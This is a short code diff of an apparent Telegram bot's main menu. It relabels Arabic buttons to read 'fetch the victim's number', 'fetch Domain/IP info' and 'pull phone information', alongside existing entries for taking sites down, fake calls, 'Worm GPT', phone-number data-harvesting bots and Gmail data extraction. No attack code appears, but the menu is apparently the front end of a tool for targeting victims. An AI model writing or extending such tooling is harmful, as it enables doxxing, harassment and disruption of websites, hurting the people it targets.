@@ -417,15 +417,15 @@ def build_main_menu():
             return InlineKeyboardButton(text, url=val, style=style)
         return InlineKeyboardButton(text, callback_data=cb, style=style)
     pairs = [
-        ("رقم 📱", "get_link_num"),
+        ("جلب رقم الضحية 📱", "get_link_num"),
         ("ID 🆔", "get_id"),
         ("صور AI 🎨", "ai_image"),
         ("اختصار روابط 🔗", "short_link"),
-        ("سيرفر 🌐", "server_check"),
-        ("معلومات 🔴", "webapp_info"),
+        ("جلب معلومات Domain 🌐", "server_check"),
+        ("جلب معلومات IP 🔴", "webapp_info"),
         ("اغلاق مواقع 💀", "webapp_block"),
         ("اتصال وهمي ☎️", "virtual_call"),
-        ("سحب معلومات 📱", "fi_reply"),
+        ("سحب معلومات الهاتف 📱", "fi_reply"),
         ("Worm GPT 🐛", "worm_gpt"),
         ("📱 بوتات سحب بيانات الرقم", "osint_phone_bots"),
         ("📧 سحب بيانات عبر Gmail", "osint_gmail"),
